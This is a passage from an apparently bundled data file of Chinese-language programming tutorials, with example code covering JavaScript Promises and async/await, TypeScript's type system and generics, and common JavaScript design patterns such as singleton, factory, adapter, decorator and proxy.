        { id: 2, userId, title: 'Post 2' }
      ]);
    }, 800);
  });
}

function fetchComments(postId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, postId, text: 'Comment 1' },
        { id: 2, postId, text: 'Comment 2' }
      ]);
    }, 600);
  });
}

// 并发执行
Promise.all([
  fetchUser(1),
  fetchPosts(1),
  fetchComments(1)
])
  .then(([user, posts, comments]) => {
    console.log('User:', user);
    console.log('Posts:', posts);
    console.log('Comments:', comments);
  })
  .catch(error => {
    console.error('Error:', error);
  });
\`\`\`

#### Promise.race 超时处理

\`\`\`javascript
function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ data: 'Some data' });
    }, 2000);
  });
}

function timeout(ms) {
  return new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error('Timeout'));
    }, ms);
  });
}

// 使用 Promise.race 实现超时
Promise.race([
  fetchData(),
  timeout(1000)
])
  .then(data => {
    console.log('Data:', data);
  })
  .catch(error => {
    console.error('Error:', error.message);
  });
\`\`\`

#### Promise.allSettled 等待所有完成

\`\`\`javascript
const promises = [
  Promise.resolve(1),
  Promise.reject(new Error('Failed')),
  Promise.resolve(3)
];

Promise.allSettled(promises)
  .then(results => {
    results.forEach((result, index) => {
      if (result.status === 'fulfilled') {
        console.log(\`Promise \${index}: \${result.value}\`);
      } else {
        console.log(\`Promise \${index}: \${result.reason.message}\`);
      }
    });
  });
\`\`\`

### async/await

**async/await 的概念：**
- 基于 Promise 的语法糖
- 使异步代码看起来像同步代码
- 更易于阅读和维护

**使用方法：**
- async 函数返回一个 Promise
- await 关键字只能在 async 函数中使用
- await 会暂停函数执行，直到 Promise 解决

### 代码示例

#### async/await 基础示例

\`\`\`javascript
async function fetchData() {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ name: 'Alice', age: 25 });
    }, 1000);
  });
}

async function main() {
  try {
    const data = await fetchData();
    console.log('Data:', data);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

#### async/await 错误处理

\`\`\`javascript
async function fetchUser(id) {
  const response = await fetch(\`/api/users/\${id}\`);
  
  if (!response.ok) {
    throw new Error(\`HTTP error! status: \${response.status}\`);
  }
  
  return response.json();
}

async function main() {
  try {
    const user = await fetchUser(1);
    console.log('User:', user);
  } catch (error) {
    console.error('Failed to fetch user:', error.message);
  }
}

main();
\`\`\`

#### async/await 并发执行

\`\`\`javascript
async function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

async function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' },
        { id: 2, userId, title: 'Post 2' }
      ]);
    }, 800);
  });
}

async function fetchComments(postId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, postId, text: 'Comment 1' },
        { id: 2, postId, text: 'Comment 2' }
      ]);
    }, 600);
  });
}

// 并发执行
async function main() {
  try {
    const [user, posts, comments] = await Promise.all([
      fetchUser(1),
      fetchPosts(1),
      fetchComments(1)
    ]);
    
    console.log('User:', user);
    console.log('Posts:', posts);
    console.log('Comments:', comments);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

#### async/await 顺序执行

\`\`\`javascript
async function fetchUser(id) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve({ id, name: \`User \${id}\` });
    }, 1000);
  });
}

async function fetchPosts(userId) {
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve([
        { id: 1, userId, title: 'Post 1' }
      ]);
    }, 800);
  });
}

// 顺序执行
async function main() {
  try {
    const user = await fetchUser(1);
    console.log('User:', user);
    
    const posts = await fetchPosts(user.id);
    console.log('Posts:', posts);
  } catch (error) {
    console.error('Error:', error);
  }
}

main();
\`\`\`

### 异步模式最佳实践

**错误处理：**
- 使用 try/catch 处理 async/await 错误
- 使用 catch() 处理 Promise 错误
- 统一错误处理策略

**并发控制：**
- 使用 Promise.all() 并行处理多个异步操作
- 使用 Promise.race() 处理超时
- 合理控制并发数量

**性能优化：**
- 避免不必要的异步操作
- 使用缓存减少重复请求
- 合理使用防抖和节流

### 代码示例

#### 并发控制

\`\`\`javascript
async function fetchUrl(url) {
  const response = await fetch(url);
  return response.json();
}

async function fetchAll(urls, concurrency = 3) {
  const results = [];
  const executing = [];
  
  for (const url of urls) {
    const promise = fetchUrl(url).then(result => {
      executing.splice(executing.indexOf(promise), 1);
      return result;
    });
    
    executing.push(promise);
    results.push(promise);
    
    if (executing.length >= concurrency) {
      await Promise.race(executing);
    }
  }
  
  return Promise.all(results);
}

const urls = [
  'https://api.example.com/data1',
  'https://api.example.com/data2',
  'https://api.example.com/data3',
  'https://api.example.com/data4',
  'https://api.example.com/data5'
];

fetchAll(urls, 3)
  .then(results => console.log('Results:', results))
  .catch(error => console.error('Error:', error));
\`\`\`

#### 请求重试

\`\`\`javascript
async function fetchWithRetry(url, options = {}, retries = 3) {
  for (let i = 0; i < retries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        throw new Error(\`HTTP error! status: \${response.status}\`);
      }
      
      return response.json();
    } catch (error) {
      if (i === retries - 1) {
        throw error;
      }
      
      // 指数退避
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

fetchWithRetry('https://api.example.com/data')
  .then(data => console.log('Data:', data))
  .catch(error => console.error('Error:', error));
\`\`\`

### 常见异步场景

**网络请求：**
- 使用 fetch 或 axios 发起请求
- 处理响应和错误
- 实现请求重试和超时

**文件操作：**
- 读取和写入文件
- 处理大文件
- 监控文件变化

**定时器：**
- setTimeout 和 setInterval
- 清除定时器避免内存泄漏
- 使用 requestAnimationFrame 进行动画

**事件处理：**
- 处理 DOM 事件
- 事件委托
- 异步事件处理

### 最佳实践

- 理解 JavaScript 单线程和异步编程
- 优先使用 async/await 而非回调函数
- 合理使用 Promise 方法处理并发
- 统一错误处理策略
- 避免回调地狱
- 控制并发数量
- 实现请求重试和超时

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"typescript-fundamentals",title:"TypeScript 核心概念与类型系统",category:"javascript",difficulty:"medium",tags:["TypeScript","类型系统","接口","泛型"],content:`## TypeScript 核心概念与类型系统

TypeScript 是 JavaScript 的超集，为 JavaScript 添加了静态类型系统，提高了代码的可靠性和可维护性。

### 类型系统

**基本类型：**
- 原始类型：string、number、boolean、null、undefined、symbol、bigint
- 对象类型：object、array、function
- 联合类型：A | B
- 交叉类型：A & B

**类型推断：**
- TypeScript 会自动推断变量的类型：TypeScript拥有强大的类型推断能力，可以根据变量的初始值、函数的返回值、变量的使用方式等自动推断变量类型，如let x = 10会自动推断x为number类型，const greeting = (name: string) => \`Hello, \${name}\`会推断返回类型为string，合理利用类型推断可以减少类型注解的工作量，同时保持类型安全
- 基于初始化值
- 基于上下文

**类型断言：**
- 告诉 TypeScript 变量的具体类型
- 使用 as 关键字
- 使用尖括号语法（在 JSX 中不推荐）

### 代码示例

#### 基本类型示例

\`\`\`typescript
// 原始类型
let name: string = 'Alice';
let age: number = 25;
let isStudent: boolean = true;
let nothing: null = null;
let notDefined: undefined = undefined;
let unique: symbol = Symbol('unique');
let bigNumber: bigint = 100n;

// 对象类型
let person: object = { name: 'Alice', age: 25 };
let numbers: number[] = [1, 2, 3];
let strings: Array<string> = ['a', 'b', 'c'];
let fn: Function = () => {};

// 联合类型
let value: string | number = 'hello';
value = 42;

// 交叉类型
type Person = { name: string };
type Employee = { id: number };
type PersonEmployee = Person & Employee;

const personEmployee: PersonEmployee = {
  name: 'Alice',
  id: 1
};
\`\`\`

#### 类型推断示例

\`\`\`typescript
// 基于初始化值
let name = 'Alice'; // 推断为 string
let age = 25; // 推断为 number
let isActive = true; // 推断为 boolean

// 基于上下文
const numbers = [1, 2, 3];
numbers.forEach(num => {
  // num 被推断为 number
  console.log(num.toFixed(2));
});

// 显式类型注解
let count: number;
count = 10;
\`\`\`

#### 类型断言示例

\`\`\`typescript
// 使用 as 关键字
let value: any = 'hello';
let length: number = (value as string).length;

// 使用尖括号语法（在 JSX 中不推荐）
let length2: number = (<string>value).length;

// 非空断言
function printName(name: string | null) {
  console.log(name!.toUpperCase()); // 断言 name 不为 null
}

// DOM 元素类型断言
const button = document.querySelector('button') as HTMLButtonElement;
button.addEventListener('click', () => {
  console.log('Button clicked');
});
\`\`\`

### 接口和类型别名

**接口：**
- 定义对象的结构
- 可以被扩展
- 可以被实现
- 适合定义对象类型

**类型别名：**
- 为类型创建别名
- 可以表示任何类型
- 不能被扩展
- 适合定义联合类型和交叉类型

### 代码示例

#### 接口示例

\`\`\`typescript
// 基本接口
interface Person {
  name: string;
  age: number;
}

const person: Person = {
  name: 'Alice',
  age: 25
};

// 可选属性
interface Product {
  id: number;
  name: string;
  price?: number; // 可选属性
}

const product: Product = {
  id: 1,
  name: 'Laptop'
};

// 只读属性
interface Point {
  readonly x: number;
  readonly y: number;
}

const point: Point = { x: 10, y: 20 };
// point.x = 15; // 错误：只读属性不能修改

// 接口扩展
interface Animal {
  name: string;
}

interface Dog extends Animal {
  breed: string;
}

const dog: Dog = {
  name: 'Buddy',
  breed: 'Golden Retriever'
};

// 接口实现
interface Clock {
  currentTime: Date;
  setTime(d: Date): void;
}

class DigitalClock implements Clock {
  currentTime: Date = new Date();
  
  setTime(d: Date) {
    this.currentTime = d;
  }
}
\`\`\`

#### 类型别名示例

\`\`\`typescript
// 基本类型别名
type Name = string;
type Age = number;
type Person = {
  name: Name;
  age: Age;
};

// 联合类型别名
type Status = 'pending' | 'success' | 'error';
type ID = string | number;

// 函数类型别名
type Callback = (error: Error | null, data?: any) => void;

function fetchData(callback: Callback) {
  // ...
}

// 泛型类型别名
type Container<T> = { value: T };
type NumberContainer = Container<number>;

// 条件类型别名
type NonNullable<T> = T extends null | undefined ? never : T;
type Result = NonNullable<string | null>; // string
\`\`\`

### 泛型

**泛型的概念：**
- 允许在定义函数、接口或类时使用类型参数
- 提高代码的复用性
- 保持类型安全

**泛型的使用：**
- 泛型函数
- 泛型接口
- 泛型类
- 泛型约束

**泛型工具类型：**
- Partial<T>：将所有属性变为可选：Partial是TypeScript内置的工具类型，将类型T的所有属性设置为可选，使用内置的映射类型遍历T的每个属性并添加?修饰符，如Partial<User>会将User的所有属性变为可选，常用于更新部分数据的场景，如更新用户信息时只需要传入要修改的字段
- Required<T>：将所有属性变为必需：Required是TypeScript内置的工具类型，与Partial相反，将类型T的所有可选属性变为必需属性，通过将属性映射并移除?修饰符实现，如Required<Partial<User>>会恢复User的所有必需属性，常用于确保某些属性必须存在的场景
- Readonly<T>：将所有属性变为只读：Readonly是TypeScript内置的工具类型，将类型T的所有属性设置为只读，添加readonly修饰符，如Readonly<User>会将User的所有属性变为只读，无法修改，常用于保护数据不被意外修改的场景，如配置对象、常量对象等
- Pick<T, K>：拣选属性：Pick是TypeScript内置的工具类型，从类型T中拣选指定的属性K组成新类型，如Pick<User, 'name' | 'email'>只保留User的name和email属性，常用于只需要对象部分属性的场景，可以创建更精确的类型，提高类型安全性和代码可读性
- Omit<T, K>：排除属性：Omit是TypeScript内置的工具类型，从类型T中排除指定的属性K组成新类型，如Omit<User, 'password'>会排除User的password属性，常用于创建不包含某些敏感属性的类型，如API返回数据时不包含密码等敏感信息
- Record<K, T>：创建键值对类型：Record是TypeScript内置的工具类型，用于创建键值对类型，K是键的类型（通常是string或number），T是值的类型，如Record<string, User>创建一个键为字符串、值为User对象的类型，常用于定义字典类型、映射类型、缓存类型等

### 代码示例

#### 泛型函数示例

\`\`\`typescript
// 基本泛型函数
function identity<T>(arg: T): T {
  return arg;
}

const num = identity<number>(42);
const str = identity('hello');

// 类型推断
const num2 = identity(42); // 推断为 number
const str2 = identity('hello'); // 推断为 string

// 多个类型参数
function pair<T, U>(first: T, second: U): [T, U] {
  return [first, second];
}

const pairResult = pair('hello', 42); // [string, number]

// 泛型约束
interface Lengthwise {
  length: number;
}

function getLength<T extends Lengthwise>(arg: T): number {
  return arg.length;
}

getLength('hello'); // 5
getLength([1, 2, 3]); // 3
// getLength(42); // 错误：number 没有 length 属性
\`\`\`

#### 泛型接口示例

\`\`\`typescript
// 泛型接口
interface Box<T> {
  value: T;
}

const stringBox: Box<string> = { value: 'hello' };
const numberBox: Box<number> = { value: 42 };

// 泛型接口作为函数类型
interface Comparator<T> {
  (a: T, b: T): number;
}

const numberComparator: Comparator<number> = (a, b) => a - b;
const stringComparator: Comparator<string> = (a, b) => 
  a.localeCompare(b);

// 泛型接口作为类类型
interface Repository<T> {
  findById(id: number): T | null;
  save(entity: T): void;
}

class UserRepository implements Repository<User> {
  private users: User[] = [];
  
  findById(id: number): User | null {
    return this.users.find(u => u.id === id) || null;
  }
  
  save(user: User): void {
    this.users.push(user);
  }
}
\`\`\`

#### 泛型类示例

\`\`\`typescript
// 泛型类
class Stack<T> {
  private items: T[] = [];
  
  push(item: T): void {
    this.items.push(item);
  }
  
  pop(): T | undefined {
    return this.items.pop();
  }
  
  peek(): T | undefined {
    return this.items[this.items.length - 1];
  }
}

const numberStack = new Stack<number>();
numberStack.push(1);
numberStack.push(2);
console.log(numberStack.pop()); // 2

const stringStack = new Stack<string>();
stringStack.push('hello');
stringStack.push('world');
console.log(stringStack.pop()); // 'world'
\`\`\`

#### 泛型工具类型示例

\`\`\`typescript
interface User {
  id: number;
  name: string;
  email: string;
  age: number;
}

// Partial<T>：将所有属性变为可选
type PartialUser = Partial<User>;
const partialUser: PartialUser = {
  name: 'Alice'
};

// Required<T>：将所有属性变为必需
type RequiredUser = Required<Partial<User>>;
const requiredUser: RequiredUser = {
  id: 1,
  name: 'Alice',
  email: 'alice@example.com',
  age: 25
};

// Readonly<T>：将所有属性变为只读
type ReadonlyUser = Readonly<User>;
const readonlyUser: ReadonlyUser = {
  id: 1,
  name: 'Alice',
  email: 'alice@example.com',
  age: 25
};
// readonlyUser.name = 'Bob'; // 错误

// Pick<T, K>：拣选属性
type UserBasicInfo = Pick<User, 'id' | 'name'>;
const basicInfo: UserBasicInfo = {
  id: 1,
  name: 'Alice'
};

// Omit<T, K>：排除属性
type UserWithoutEmail = Omit<User, 'email'>;
const userWithoutEmail: UserWithoutEmail = {
  id: 1,
  name: 'Alice',
  age: 25
};

// Record<K, T>：创建键值对类型
type UserRecord = Record<number, User>;
const users: UserRecord = {
  1: { id: 1, name: 'Alice', email: 'alice@example.com', age: 25 },
  2: { id: 2, name: 'Bob', email: 'bob@example.com', age: 30 }
};
\`\`\`

### 高级类型

**条件类型：**
- 基于条件选择类型
- 使用 extends 关键字
- 结合 infer 关键字推断类型

**映射类型：**
- 基于现有类型创建新类型
- 遍历现有类型的属性
- 对每个属性进行转换

**模板字面量类型：**
- 使用字符串模板语法创建类型
- 支持字符串操作
- 适合创建动态类型

### 代码示例

#### 条件类型示例

\`\`\`typescript
// 基本条件类型
type IsString<T> = T extends string ? true : false;

type Test1 = IsString<string>; // true
type Test2 = IsString<number>; // false

// 条件类型与联合类型
type NonNullable<T> = T extends null | undefined ? never : T;

type Test3 = NonNullable<string | null>; // string

// infer 关键字
type ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

function foo(): string {
  return 'hello';
}

type FooReturn = ReturnType<typeof foo>; // string

// 提取数组元素类型
type ArrayElement<T> = T extends (infer U)[] ? U : never;

type Numbers = number[];
type NumberElement = ArrayElement<Numbers>; // number

// 提取 Promise 的值类型
type PromiseValue<T> = T extends Promise<infer U> ? U : never;

type PromiseString = Promise<string>;
type StringValue = PromiseValue<PromiseString>; // string
\`\`\`

#### 映射类型示例

\`\`\`typescript
// 基本映射类型
type Readonly<T> = {
  readonly [P in keyof T]: T[P];
};

type Partial<T> = {
  [P in keyof T]?: T[P];
};

interface User {
  name: string;
  age: number;
}

type ReadonlyUser = Readonly<User>;
type PartialUser = Partial<User>;

// 映射类型 + 条件类型
type Getters<T> = {
  [P in keyof T as \`get\${Capitalize<string & P>}\`]: () => T[P];
};

interface Person {
  name: string;
  age: number;
}

type PersonGetters = Getters<Person>;
// {
//   getName: () => string;
//   getAge: () => number;
// }

// 映射类型 + 模板字面量类型
type EventHandlers<T> = {
  [K in keyof T as \`on\${Capitalize<string & K>}\`]?: (event: T[K]) => void;
};

interface Events {
  click: MouseEvent;
  change: Event;
}

type EventHandlersType = EventHandlers<Events>;
// {
//   onClick?: (event: MouseEvent) => void;
//   onChange?: (event: Event) => void;
// }
\`\`\`

#### 模板字面量类型示例

\`\`\`typescript
// 基本模板字面量类型
type Greeting = \`Hello, \${string}!\`;
const greeting: Greeting = 'Hello, World!';

// 模板字面量类型 + 联合类型
type Color = 'red' | 'green' | 'blue';
type Quantity = 'light' | 'medium' | 'dark';
type ColorQuantity = \`\${Quantity}-\${Color}\`;

const color1: ColorQuantity = 'light-red';
const color2: ColorQuantity = 'dark-blue';

// 模板字面量类型 + 工具类型
type EventName = \`on\${Capitalize<string>}\`;
type ClickEvent = EventName<'click'>; // 'onClick'

// 实际应用：CSS 属性
type CSSProperty<T extends string> = \`--\${T}\`;
type CustomProperty = CSSProperty<'primary-color'>; // '--primary-color'
\`\`\`

### 模块系统

**模块的概念：**
- 代码的独立单元
- 导出和导入功能
- 避免命名冲突

**导出方式：**
- 命名导出
- 默认导出
- 重导出

**导入方式：**
- 命名导入
- 默认导入
- 命名空间导入

### 代码示例

#### 模块导出示例

\`\`\`typescript
// utils.ts
// 命名导出
export function add(a: number, b: number): number {
  return a + b;
}

export function subtract(a: number, b: number): number {
  return a - b;
}

// 默认导出
export default function multiply(a: number, b: number): number {
  return a * b;
}

// 类型导出
export interface User {
  id: number;
  name: string;
}

export type ID = string | number;

// 重导出
export { add, subtract } from './math';
export * from './constants';
\`\`\`

#### 模块导入示例

\`\`\`typescript
// main.ts
// 命名导入
import { add, subtract } from './utils';
import type { User } from './utils';

// 默认导入
import multiply from './utils';

// 命名空间导入
import * as utils from './utils';
utils.add(1, 2);

// 混合导入
import multiply, { add, subtract } from './utils';

// 动态导入
async function loadModule() {
  const utils = await import('./utils');
  console.log(utils.add(1, 2));
}
\`\`\`

### 最佳实践

- 使用类型注解提高代码可读性
- 优先使用接口定义对象类型
- 合理使用泛型提高代码复用性
- 使用类型别名定义联合类型和交叉类型
- 理解和使用高级类型
- 合理组织模块和导出
- 避免使用 any 类型
- 使用 strict 模式

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"typescript-advanced",title:"TypeScript 高级特性与类型体操",category:"javascript",difficulty:"hard",tags:["TypeScript","高级类型","类型体操","类型挑战"],content:`## TypeScript 高级特性与类型体操

TypeScript 的类型系统非常强大，支持类型级别的编程，通过类型体操可以实现复杂的类型逻辑。

### 条件类型

**条件类型的语法：**
- T extends U ? X : Y
- 类似于 JavaScript 的三元运算符
- 在类型级别进行条件判断

**条件类型的应用：**
- 类型守卫
- 类型推断
- 条件类型分发

**infer 关键字：**
- 在条件类型中推断类型
- 只能在 extends 子句中使用
- 用于提取函数参数、返回值、Promise 类型等

### 映射类型

**映射类型的语法：**
- { [P in K]: T }
- 遍历类型 K 的所有属性
- 为每个属性创建新的类型

**映射修饰符：**
- readonly：只读属性
- ?: 可选属性
- -readonly：移除只读修饰符
- -?: 移除可选修饰符

**键重映射：**
- 使用 as 关键字重映射键
- 支持模板字面量类型
- 可以基于原键创建新键

### 模板字面量类型

**模板字面量类型的语法：**
- \`\${T}\`
- 类似于 JavaScript 的模板字符串
- 在类型级别进行字符串操作

**模板字面量类型的应用：**
- 创建事件名称类型
- 构建 API 路径类型
- 生成 CSS 类名类型

**字符串操作类型：**
- Uppercase<S>：转为大写
- Lowercase<S>：转为小写
- Capitalize<S>：首字母大写
- Uncapitalize<S>：首字母小写

### 递归类型

**递归类型的概念：**
- 类型引用自身
- 用于定义嵌套结构
- 支持深度操作

**递归类型的应用：**
- 深度只读类型
- 深度部分类型
- 递归数据结构

### 类型体操实践

**类型挑战：**
- Pick：拣选属性
- Readonly：只读属性
- TupleToObject：元组转对象
- First：获取数组第一个元素
- Length：获取元组长度
- Exclude：排除类型
- Awaited：Promise 解包：Awaited是TypeScript内置的工具类型，用于解包Promise的返回值类型，将Promise<T>中的T提取出来，如Awaited<Promise<string>>会得到string类型，Awaited<Promise<number>>会得到number类型，常用于处理异步函数的返回类型，提高类型安全性
- If：条件类型
- Concat：数组连接
- Includes：数组包含

**实用类型工具：**
- DeepReadonly：深度只读
- DeepPartial：深度部分
- DeepRequired：深度必需
- DeepMutable：深度可变
- DeepNullable：深度可空
- JsonValue：JSON 值类型

### 最佳实践

- 从简单到复杂，循序渐进
- 理解类型系统的工作原理
- 合理使用类型体操，避免过度复杂
- 为复杂类型添加注释
- 利用类型推断减少显式类型标注
- 测试类型定义的正确性
- 参考 TypeScript 官方类型定义
- 学习社区中的类型体操技巧`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-design-patterns",title:"JavaScript 设计模式与应用",category:"javascript",difficulty:"medium",tags:["JavaScript","设计模式","单例","工厂"],content:`## JavaScript 设计模式与应用

设计模式是解决软件设计中常见问题的可重用方案。在 JavaScript 中，设计模式不仅可以帮助我们编写更加优雅、可维护的代码，还能提高代码的可读性和可扩展性。JavaScript 的动态特性使得某些设计模式的实现与传统面向对象语言有所不同，理解这些差异对于正确应用设计模式至关重要。

### 创建型模式

**单例模式（Singleton）：**
单例模式确保一个类只有一个实例，并提供全局访问点。在 JavaScript 中，单例模式常用于管理全局状态、配置对象、数据库连接池等场景。实现单例模式的关键是控制实例的创建过程，确保多次调用构造函数时返回同一个实例。

\`\`\`javascript
// 单例模式实现
class Singleton {
  static instance = null;
  
  constructor() {
    if (Singleton.instance) {
      return Singleton.instance;
    }
    Singleton.instance = this;
    this.data = {};
  }
  
  static getInstance() {
    if (!Singleton.instance) {
      Singleton.instance = new Singleton();
    }
    return Singleton.instance;
  }
}

// 使用示例
const instance1 = new Singleton();
const instance2 = Singleton.getInstance();
console.log(instance1 === instance2); // true

// 模块模式实现单例
const ConfigManager = (function() {
  let instance;
  
  function createInstance() {
    const config = {};
    return {
      get: (key) => config[key],
      set: (key, value) => { config[key] = value; },
      getAll: () => ({ ...config }),
    };
  }
  
  return {
    getInstance: () => {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    },
  };
})();

// ES6 模块天然是单例
// config.js
export const config = {
  apiUrl: 'https://api.example.com',
  timeout: 5000,
};
\`\`\`

**工厂模式（Factory）：**
工厂模式封装对象的创建过程，提供统一的创建接口，隐藏具体实现细节。工厂模式分为简单工厂、工厂方法和抽象工厂三种。在 JavaScript 中，工厂模式常用于创建复杂对象、根据条件创建不同类型的对象等场景。

\`\`\`javascript
// 简单工厂
class ButtonFactory {
  static create(type) {
    switch (type) {
      case 'primary':
        return new PrimaryButton();
      case 'secondary':
        return new SecondaryButton();
      case 'danger':
        return new DangerButton();
      default:
        throw new Error(\`Unknown button type: \${type}\`);
    }
  }
}

// 工厂方法
class Dialog {
  createButton() {
    throw new Error('Subclass must implement createButton method');
  }
  
  render() {
    const button = this.createButton();
    button.render();
  }
}

class WindowsDialog extends Dialog {
  createButton() {
    return new WindowsButton();
  }
}

class WebDialog extends Dialog {
  createButton() {
    return new HTMLButton();
  }
}

// 抽象工厂
class GUIFactory {
  createButton() {}
  createCheckbox() {}
}

class WindowsFactory extends GUIFactory {
  createButton() {
    return new WindowsButton();
  }
  createCheckbox() {
    return new WindowsCheckbox();
  }
}

class MacOSFactory extends GUIFactory {
  createButton() {
    return new MacOSButton();
  }
  createCheckbox() {
    return new MacOSCheckbox();
  }
}
\`\`\`

**构造器模式（Constructor）：**
构造器模式使用构造函数创建对象，初始化对象状态。在 JavaScript 中，构造函数可以与原型链配合实现属性和方法的共享，减少内存消耗。ES6 的 class 语法是构造函数的语法糖，使代码更加清晰。

\`\`\`javascript
// ES5 构造函数
function Person(name, age) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function() {
  console.log(\`Hello, I'm \${this.name}\`);
};

Person.species = 'Homo sapiens'; // 静态属性

// ES6 类语法
class Person {
  static species = 'Homo sapiens';
  
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  
  greet() {
    console.log(\`Hello, I'm \${this.name}\`);
  }
  
  static getSpecies() {
    return Person.species;
  }
}

const person = new Person('Alice', 25);
person.greet(); // "Hello, I'm Alice"
\`\`\`

**原型模式（Prototype）：**
原型模式基于原型链创建对象，通过克隆现有对象来创建新对象。JavaScript 天然支持原型继承，Object.create() 方法是实现原型模式的核心。原型模式适合创建成本较高的对象，通过克隆提高性能。

\`\`\`javascript
// 原型模式实现
const prototype = {
  greet() {
    console.log(\`Hello, I'm \${this.name}\`);
  },
  clone() {
    return Object.create(this);
  },
};

const person1 = Object.create(prototype);
person1.name = 'Alice';

const person2 = person1.clone();
person2.name = 'Bob';

// 使用 Object.assign 实现深拷贝
const deepClone = (obj) => {
  if (obj === null || typeof obj !== 'object') return obj;
  
  if (Array.isArray(obj)) {
    return obj.map(deepClone);
  }
  
  const cloned = Object.create(Object.getPrototypeOf(obj));
  for (const key in obj) {
    if (obj.hasOwnProperty(key)) {
      cloned[key] = deepClone(obj[key]);
    }
  }
  return cloned;
};
\`\`\`

### 结构型模式

**适配器模式（Adapter）：**
适配器模式转换接口，使不兼容的接口能够一起工作。在 JavaScript 中，适配器模式常用于整合第三方库、处理不同数据格式、统一 API 接口等场景。适配器模式可以在不修改原有代码的情况下，实现接口的兼容。

\`\`\`javascript
// 适配器模式示例
// 旧 API
const oldAPI = {
  getUserInfo: (id) => ({ id, name: 'Alice', age: 25 }),
};

// 新 API
const newAPI = {
  fetchUser: async (id) => ({ userId: id, userName: 'Alice', userAge: 25 }),
};

// 适配器
class UserAPIAdapter {
  constructor(api) {
    this.api = api;
  }
  
  async getUser(id) {
    const user = await this.api.fetchUser(id);
    // 转换数据格式
    return {
      id: user.userId,
      name: user.userName,
      age: user.userAge,
    };
  }
}

// 使用适配器
const adapter = new UserAPIAdapter(newAPI);
const user = await adapter.getUser(1);
// { id: 1, name: 'Alice', age: 25 }

// 接口适配器
class LocalStorageAdapter {
  get(key) {
    const value = localStorage.getItem(key);
    try {
      return JSON.parse(value);
    } catch {
      return value;
    }
  }
  
  set(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
  }
  
  remove(key) {
    localStorage.removeItem(key);
  }
}
\`\`\`

**装饰器模式（Decorator）：**
装饰器模式动态为对象添加额外功能，不修改原有代码。在 JavaScript 中，装饰器模式可以通过高阶函数、类装饰器等方式实现。装饰器模式适合在不改变对象结构的情况下，扩展对象的功能。

\`\`\`javascript
// 函数装饰器
function log(target, name, descriptor) {
  const original = descriptor.value;
  descriptor.value = function(...args) {
    console.log(\`Calling \${name} with args:\`, args);
    const result = original.apply(this, args);
    console.log(\`Result:\`, result);
    return result;
  };
  return descriptor;
}

class Calculator {
  @log
  add(a, b) {
    return a + b;
  }
}

// 高阶函数装饰器
function withLogging(fn) {
  return function(...args) {
    console.log('Arguments:', args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

function withTiming(fn) {
  return function(...args) {
    const start = performance.now();
    const result = fn.apply(this, args);
    const end = performance.now();
    console.log(\`Execution time: \${end - start}ms\`);
    return result;
  };
}

// 组合装饰器
const decoratedFn = withLogging(withTiming(expensiveOperation));

// 对象装饰器
class Coffee {
  cost() {
    return 5;
  }
}

class MilkDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 2;
  }
}

class SugarDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 1;
  }
}

let coffee = new Coffee();
coffee = new MilkDecorator(coffee);
coffee = new SugarDecorator(coffee);
console.log(coffee.cost()); // 8
\`\`\`

**代理模式（Proxy）：**
代理模式控制对对象的访问，添加额外的行为。ES6 的 Proxy 对象是实现代理模式的强大工具，可以拦截各种操作，如属性访问、赋值、函数调用等。代理模式常用于数据验证、缓存、访问控制等场景。

\`\`\`javascript
// 使用 ES6 Proxy
const user = { name: 'Alice', age: 25 };

const userProxy = new Proxy(user, {
  get(target, prop) {
    console.log(\`Getting \${prop}\`);
    return target[prop];
  },
  
  set(target, prop, value) {
    console.log(\`Setting \${prop} to \${value}\`);
    if (prop === 'age' && typeof value !== 'number') {
      throw new TypeError('Age must be a number');
    }
    target[prop] = value;
    return true;
  },
  
  has(target, prop) {
    console.log(\`Checking if \${prop} exists\`);
    return prop in target;
  },
});

// 缓存代理
function createCacheProxy(fn) {
  const cache = new Map();
  
  return new Proxy(fn, {
    apply(target, thisArg, args) {
      const key = JSON.stringify(args);
      
      if (cache.has(key)) {
        console.log('Returning cached result');
        return cache.get(key);
      }
      
      const result = target.apply(thisArg, args);
      cache.set(key, result);
      return result;
    },
  });
}

const expensiveCalculation = (n) => {
  console.log('Calculating...');
  return n * n;
};

const cachedCalculation = createCacheProxy(expensiveCalculation);
cachedCalculation(5); // Calculating... 25
cachedCalculation(5); // Returning cached result 25
\`\`\`

**外观模式（Facade）：**
外观模式提供统一的接口，简化复杂系统的使用。在 JavaScript 中，外观模式常用于封装复杂的 API 调用、统一多个模块的接口、简化库的使用等场景。外观模式可以降低系统的复杂度，提高代码的可读性。

\`\`\`javascript
// 外观模式示例
class PaymentFacade {
  constructor() {
    this.validator = new PaymentValidator();
    this.processor = new PaymentProcessor();
    this.notifier = new NotificationService();
    this.logger = new Logger();
  }
  
  async processPayment(paymentInfo) {
    try {
      // 验证支付信息
      this.validator.validate(paymentInfo);
      
      // 处理支付
      const result = await this.processor.process(paymentInfo);
      
      // 发送通知
      await this.notifier.sendConfirmation(paymentInfo.email, result);
      
